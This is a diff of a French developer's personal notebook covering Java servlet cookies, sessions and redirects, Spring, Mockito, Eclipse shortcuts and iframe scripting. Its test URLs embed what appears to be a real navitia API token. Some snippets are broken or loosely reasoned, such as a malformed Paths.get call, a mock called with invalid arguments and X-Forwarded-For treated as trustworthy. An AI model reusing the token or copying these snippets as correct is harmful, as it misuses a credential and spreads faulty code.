-                              System.out.println(cookie.getPath());
-                              if (cookieName.equals(cookie.getName()))
-                                return(cookie.getValue());
-                            }
-                            return(defaultValue);
-                          }
-      methode plus rapide avec spring: WebUtils.getCookie(request, "nomdemoncookie");
-  pour definir ajouter add un cookie:
-      response.addCookie(new Cookie("com.hraccess.portal.last_language", "fr_FR"));
-  renvoyer les codes d'erreur ou de succes à la reponse:(200, 500 etc...) 
-      httpServletResponse.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
-Super methode: recupere la session si il y en a une. Sinon, il en cree une nouvelle      
-    à toute request requete meme sans moimeme creer de session, le serveur defini un jsessionid dans le cookie par defaut: je le recup sur le serveur comme ça:
-        HttpSession session = servletRequest.getSession();
-    		String jsessionid = session.getId();
-        HttpSession session = request.getSession(true); //// attention recree une  nouvelle session si elle n'existe plus (mettre false si on ne veut pas ca) 
-        et ensuite on peut recuperer des variables liees à  cette session:
-          ShoppingCart previousItems =(ShoppingCart)session.getAttribute("previousItems"); (ou getValue... mais deprecie)
-         On peut tout recuperer avec l'objet session: le temps passe sur le site, le nombre de fois, la date d'acces au site....
-         request.isRequestedSessionIdValid() // est equivalent à request.getSession(false); je crois. mais si je veux savoir si l'utilisateur a ete authentifie je devrais ajouter une variable dans la session. Ou bien utiliser le request.getUserPrincipal()? 
-************************ 
-  recuperer les valeurs d'un select du request
-            request.getParameterValues("nomDeMonSelect"); // recupere les parametres get ou post. Ne pas confondre avec request.getAttribute() .setAttribute() c'est uniquement cote serveur: utilisable entre jsp et servlet aussi. Ne vient pas d'une requette request http. Peut etre un objet
-
-    		
-    		
-  redirige redirection web en java: (voir aussi LINKRedirectwebservice)
-    HttpServletResponse servletResponse = (HttpServletResponse)response;
-    servletResponse.sendRedirect("http://www.google.com"); Fait une redirection 302( pour faire une 301 faire response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY);response.setHeader("Location", "http://somewhere/"); //pour un webservice voir //LINKredirwebservice998 
-    servletResponse.sendRedirect("/login");ou response.sendRedirect(request.getContextPath()+"/show.html"); // la requette request est renvoyee vers le client(url change sur browser navigateur) et redirige vers nouvelle url avec perte des params de la requette. !=.getRequestDispatcher("/urlduncontrolleur").forward(req, resp) ça reste côte serveur: ça ne va pas vers navigateur client: les params de requette sont conserves. voir LINKçç("'"'
-          ATTENTION! doit être la dernière chose executee: pas de chain après ou d'autre redirection de requette! sinon j'aurais java.lang.IllegalStateException: Impossible d'utiliser faire-suivre (forward) après que la reponse ait ete envoyee          
-  pour voir l'adresse ip du client adresse ip du reverse proxy:
-      String ipadress = request.getHeader("X-FORWARDED-FOR"); // renvoit l'adresse ip de l'utilisateur client original
-      if (ipadress==null)
-      {
-        servletRequest.getRemoteAddr(); // ip du reverse proxy si il y en a 
-      }
-    ou recuperer adresse ip de l'appelant d'une servlet
-        servletRequest.getRemoteAddr()
     PRG :
           GET: ne modifie jamais l'état du systeme sauf des trucs comme le logs, ne fait que renvoyer data comme un select. always load pages using GET
           PUT: ne fait que modifier update un data du système
@@ -3421,8 +3430,7 @@ Super methode: recupere la session si il y en a une. Sinon, il en cree une nouve
                         URI go = new URI("https://"+httpRequest.getServerName()+"/app/foryou/denied.html?samlDenied");
                         javax.ws.rs.core.Response response = javax.ws.rs.core.Response.seeOther(go).build(); //LINKRedirectwebservice
                         return response;
-pour recuperer le nom de l'utilisateur connecte: 
-    request.getUserPrincipal()
+
 exemple de generation de graphique avec jcharts: c'est une jsp: 
                   <%@ page language="java" contentType="text/html; charset=ISO-8859-1" errorPage="/error_pages/redirect_error.jsp"%>
                   <%@ page import="es.renault.util.i18n.struts.services.I18NService, es.renault.util.i18n.I18NManager"%>
@@ -5357,7 +5365,7 @@ Spring : XML STYLE
                                     @RequestMapping(value = "/inputbadge", method = RequestMethod.POST//est GET par defaut, produces = MediaType.APPLICATION_JSON_VALUE ou MediaType.APPLICATION_STREAM_JSON_VALUE ou MediaType.TEXT_EVENT_STREAM_VALUE)
                                     @ResponseBody
                                     //@ResponseStatus(HttpStatus.OK)
-                                    public OutputBadge inputBadge(Locale locale, @RequestBody InputBadge inputBadge, HttpServletResponse httpServletResponse) throws Exception {
+                                    public OutputBadge inputBadge(Locale locale, @RequestBody(ne parche pas avec GET) InputBadge inputBadge, HttpServletResponse httpServletResponse) throws Exception {
                                         boolean res = false;
                                         recup le locale grace au localeresolver: 
                                             LocaleResolver localeResolver = RequestContextUtils.getLocaleResolver(request); Locale locale = localeResolver.resolveLocale(request);
@@ -15935,7 +15943,11 @@ JMockit :(le top car permet de tester l'intestable)>Mockito>EasyMock>Jmock AFAIR
 
     FilterConfig filterConfig = mock(FilterConfig.class);
     ServletContext context = mock(ServletContext.class);
-    when(filterConfig.getServletContext()).thenReturn(context);
+    when(filterConfig.getServletContext(
+                                        anyString()//tout string
+                                        , eq(Http.GET)// si je peux pas faire "any" je fais ça
+                                        ,anyObject(UneClasse.class)
+                                        ).thenReturn(context);
     ResultDao rd =mock(ResultDao.class);
     Result toto = new Result();
     Mockito.doReturn(toto).when(rd).getLaMethodeResult("1"); // retourner toto quand on execute resultdao.getResult("1");
@@ -20083,6 +20095,7 @@ encodage : encode :
                 }
     url decoder: 
     java.net.URLDecoder.decode(url, "UTF-8");
+    pointvirgule point virgule : %3B%0A
   
 pour deflateandencode : 
       import java.util.zip.Deflater;
@@ -22218,6 +22231,9 @@ pour recuperer les bytes d'un fichier:
 pour recuperer le string d'un fichier lire un fichier
         depuis java10 je crois:
                 new FileInputStream("path/fichier.txt").transfertTo(System.out)
+        java7 et plus:
+          Path resPath = Paths.get(this.getClass()).getResource("/chemin/unfichier.son").toURI());
+          String jsonContent = new String(java.nio.file.Files.readAllBytes(resPath),"UTF8");  
         public String getStringFromFile(File file) throws Exception
         	{
         		ByteArrayOutputStream  lByteOut = new ByteArrayOutputStream();
@@ -23271,6 +23287,8 @@ si j'ai eclipse edit source lookup path source not found lors du debuggage:
   peut etre ajouter -DdownloadSources=true après commande maven
   puis
   package>clique droit sur la librairie maven manquante >Maven>download sources. Ensuite Debug... >onglet sources> add source > external archive > ajouter la librairie xxx.source dans le buidpath (peut etre besoin redemarrer eclipse mais redemarrer le debugger) IL FAUT REDEMARRER LE DEBUGGAGE POUR QUIL PRENNE EN COMPTE
+focuser sur la next error problem
+    ctrl+shift+.
 afficher n'importe quelle vue view rapidement; liste des erreurs problemes: 
         Alt+shift+q puis q
 comparer les fichiers un a un:
@@ -23352,7 +23370,7 @@ raccourcis shortcuts utiles: (pour les definir: WIndows>Preference>chercher "sho
       Alt+Maj+Q, Q: afficher une pannel vue specifique (plus rapide que CTRL+F7)
       ALT+Shift+X; T: lance JUnit test sur la classe en cours.
       CTRL + F8: switcher entre perspectives
-      CTRL + M: maximise/minimise agrandir aggrandir fenetre windows 
+      CTRL + M: plein ecran maximise/minimise agrandir aggrandir fenetre windows 
       F2 ou ctrl+Shift+1: quickfix pour corriger l'erreur rapidement
       ctrl + F7 switch between views
       ctrl + F11 Run last Launched REEXECUTER (se mettre sur un fichier java pour que ça marche)
@@ -28302,7 +28320,7 @@ pour recharger la fenetre à partir d'une iframe
      document.location.reload(true)	
      ou 
       window.top.location='/{!Lead.id}'; //une adresse (la ca marche sur salesforce)
-pour appeller une methode du frame parent: self.parentWindow.mamethode();  ou document.parentWindow.mamethode();
+pour appeller une methode du frame parent: self.parentWindow.mamethode();  ou document.parentWindow.mamethode();  si message unsafe javascript.crosssitecross-site.. essayer ave <iframe src="..." sandbox="allow-top-navigation ou alllow-forms ou allow-scripts ou allow-same-origin (ne pas mettre ces deux derniers ensemble) ou allow-popups ou allow-pointer-lock"
 pour appeller une methode de la fenetre parente: window.opener.monFormulaire 
 ou window.opener.maFonctionJavascript ...(pas sur)
 			autre exemple: opener.document.getElementById('mask').style.display='inline';// inline si c du texte, block si c'est un div( avec une image par exemple)
@@ -31239,6 +31257,8 @@ pour recuperer les rôles de l'utilisateur qui s'est connecté côté IDP:
         }                
         
 windows : (commande dos :)
+renommer un repertoire en un autre : 
+    rename dir1 dir2
     commande dos pour voir les ports utilises sur mon ordi: netstat (voir netstat plus haut)
     les alias: c a d le nom des serveurs et adresse ip sont a definir dans C:/WINNT/system32/drivers/etc/hosts: a la modif il prend en compte tout de suite. LINKàç<çç_à
     si je veux me connecter en dur sur miami: aller dans panneau de configuration > Reseau > protocole > TCP/IP > propriete adresse IP: 10.68.81.253 ou 242 masque: 255.255.255.0 Valider et redemarrer l'ordinateur.
@@ -32061,7 +32081,7 @@ pour tester les urls ci dessous
       https://f29788f3-a3ac-41ed-a476-5145b5d7583f@api.navitia.io/v1/coord/2.3749036;48.8467927/places_nearby idf 10 reponses OK
       https://f29788f3-a3ac-41ed-a476-5145b5d7583f@api.navitia.io/v1/coord/2.39107;48.65775/places_nearby idf 10 reponses OK
       https://f29788f3-a3ac-41ed-a476-5145b5d7583f@api.navitia.io/v1/coord/2.2922926;48.8583736/places_nearby idf 10 reponses OK
-      Journee interne coverage
+      Journey interne coverage
       https://f29788f3-a3ac-41ed-a476-5145b5d7583f@api.navitia.io/v1/journeys?from=2.3749036;48.8467927&to=2.2922926;48.8583736 idf-idf OK
       https://f29788f3-a3ac-41ed-a476-5145b5d7583f@api.navitia.io/v1//journeys?from=2.33245;48.77469&to=2.39107;48.65775 idf-idf OK
       https://f29788f3-a3ac-41ed-a476-5145b5d7583f@api.navitia.io/v1//journeys?from=2.33245;48.77469&to=2.64788;48.31951 idf-limiteDansIdf OK
